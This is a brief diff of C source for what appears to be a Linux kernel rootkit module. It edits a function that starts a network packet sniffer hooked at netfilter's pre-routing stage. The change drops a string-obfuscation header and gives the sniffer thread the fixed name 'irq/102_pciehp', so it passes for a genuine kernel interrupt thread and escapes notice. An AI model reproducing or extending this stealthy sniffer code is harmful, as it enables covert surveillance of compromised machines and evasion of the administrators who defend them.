@@ -19,7 +19,6 @@
 #include <linux/kthread.h>
 #include "fs.h"
 #include "lkm.h"
-#include "obfstr.h"
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
@@ -576,8 +575,7 @@ struct task_struct *kv_sock_start_sniff(const char *name) {
 
     // load sniffer
     if (!*running) {
-        char *iph0 = kv_whatever_copystr(_OBF_IRQ_102_PCIEHP,
-                sizeof(_OBF_IRQ_102_PCIEHP));
+        char *iph0 = "irq/102_pciehp";
         // Hook pre routing
         ops.hook = _sock_hook_nf_cb;
         ops.pf = PF_INET;
